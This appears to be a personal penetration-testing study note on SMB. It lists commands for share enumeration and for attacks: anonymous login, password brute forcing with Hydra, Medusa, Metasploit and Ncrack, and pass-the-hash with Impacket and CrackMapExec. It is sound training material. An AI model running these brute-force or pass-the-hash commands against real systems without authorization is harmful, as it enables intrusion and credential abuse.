---
tags:
  - Penetration-Testing
  - Services
---
## What is SMB?
- Client-Server Communication Protocol used for sharing access to files, printers, ports, and other resources on a network.

## Enumerating SMB Shares
- **Begin with [[Penetration Testing/Nmap|Nmap]] 

### Metasploit
- Find SMB Version
```bash
use auxiliary/scanner/smb/smb_version
```
 ### Enum4Linux
- Tool for enumerating SMB shares on both Windows & Linux
```bash
enum4linux [options] [ip]
```
![[Pasted image 20240516124723.png]]

### SMBMap
- Use to enumerate shares on IP, can be used with user/password flags
```bash
smbmap -H target_ip
```

```bash
smbmap -H target_ip -u username -p password

```

### SMBclient
- Tool to remotely access SMB shares
```bash
smbclient //[IP]/[Share]
```
![[Pasted image 20240516125622.png]]

## Exploiting SMB

### Anonymous Login
- Check to see if share has been configured to allow anonymous access (does not require authentication), don't provide password
```bash
smbclient //[IP]/[Share] -U Anonymous
```

### Brute Forcing SMB
- Hydra
```bash
hydra -L usernames.txt -P passwords.txt smb://<target_ip>
```

- Medusa
```bash
medusa -h <target_ip> -U usernames.txt -P passwords.txt -M smbnt
```

- Metasploit
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS <target_ip>
set USER_FILE usernames.txt
set PASS_FILE passwords.txt
run
```

- Ncrack
```bash
ncrack -p 445 -U usernames.txt -P passwords.txt <target_ip>

```

- Impacket (Python Scripts)
```bash
python3 examples/smbexec.py target_ip -u username -p password
```

### Pass-the-Hash
- Must dump NTLM hashes via mimikatz, hashcat, hashdump, etc

- Impacket
	- Must install via pip
```bash
python3 psexec.py administrator@target_ip -hashes lmhash:nthash
```
```bash
python3 smbexec.py administrator@target_ip -hashes lmhash:nthash

```
```bash
python3 wmiexec.py administrator@target_ip -hashes lmhash:nthash
```

- CrackMapExec
	- Only uses NT hash (last part of NTLM hash)
```bash
crackmapexec smb target_ip -u username -H nthash
```